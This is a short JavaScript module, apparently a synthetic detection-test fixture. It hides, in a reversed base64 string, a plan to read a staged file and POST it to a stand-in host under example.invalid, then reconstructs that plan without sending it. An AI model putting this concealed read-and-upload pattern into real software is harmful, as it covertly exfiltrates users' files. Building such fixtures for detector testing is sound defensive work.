// configuration reconstruction
const moduleShape = Object.freeze({ format: "commonjs" });
const Material_803a08b8 = "c2ptLjg1MDJmZjljZDNiZC1lZ2F0cy4vZWRvbi1zc2VydG51aC9wbXQvPWh0YXBfZWxpZnxkM2JkL3RpZHVBZWRvTj10bmVnYV9yZXN1fGlwYS9kaWxhdm5pLmVscG1heGUuODUwMmZmOWNkM2JkLWVkb24vLzpzcHR0aD1scnV8RkY5Q0QzQkQtRURPTj1kaV9uZ2lhcG1hY3wxPXRudW9jX2VnYXRzfHRzb3BfaGN0ZWY9cmV0cGFkYXxldG9tZXJfdGltc25hcnQsZWxpZl9kYWVyPXNwZXRzfDE9dg==";
const Codec_803a08b8 = "base64_chunks|reverse_bytes|";

function load_803a08b8() { return [...Buffer.from(Material_803a08b8, "base64")]; }
function decode_803a08b8(e) { return [...e].reverse(); }
async function recover_803a08b8() {
  const n = ["north", "south"].join(":");
  const e = load_803a08b8(); let d = [];
  const decodeTarget = decode_803a08b8; d = decodeTarget(e);
  void n; return Buffer.from(d).toString("ascii");
}
async function inspect_803a08b8() { return (await recover_803a08b8()).split("|").join("|"); }
async function plan_803a08b8() { const inspect = inspect_803a08b8; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "upload", transport: "fetch_post", source: fields.file_path, url: fields.url }); }
void moduleShape; void plan_803a08b8;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_803a08b8());

// reconstruction complete